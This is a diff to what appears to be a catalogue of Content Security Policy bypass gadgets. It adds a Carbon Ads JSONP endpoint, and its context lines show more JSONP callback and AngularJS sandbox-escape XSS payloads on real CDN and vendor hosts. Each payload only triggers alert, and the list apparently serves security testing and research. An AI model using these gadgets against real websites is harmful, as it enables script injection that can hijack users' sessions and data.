@@ -100,6 +100,7 @@ server.ethicalads.io	<script src="https://server.ethicalads.io/api/v1/decision/?
 shop.samsung.com	<script src="https://shop.samsung.com/br/_v/private/ng/p4v1/getCartCount?callback=alert"></script>
 social.yandex.ru	<script src="https://social.yandex.ru/providers.jsonp?callback=alert"></script>
 soundcloud.com	<script src="https://soundcloud.com/oembed?format=js&callback=alert&url=https://soundcloud.com/rich-the-kid/plug-walk-1"></script>
+srv.carbonads.net	<script src="https://srv.carbonads.net/ads/x.json?callback=alert"></script>
 ssl.gstatic.com	<body ng-app ng-csp><script src="//ssl.gstatic.com/fsn/angular_js-bundle1.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 st3.zoom.us	<body ng-app ng-csp><script src="https://st3.zoom.us/static/6.2.7600/js/lib/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 static.parastorage.com	<body ng-app ng-csp><script src="https://static.parastorage.com/services/third-party/angularjs/1.4.5/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
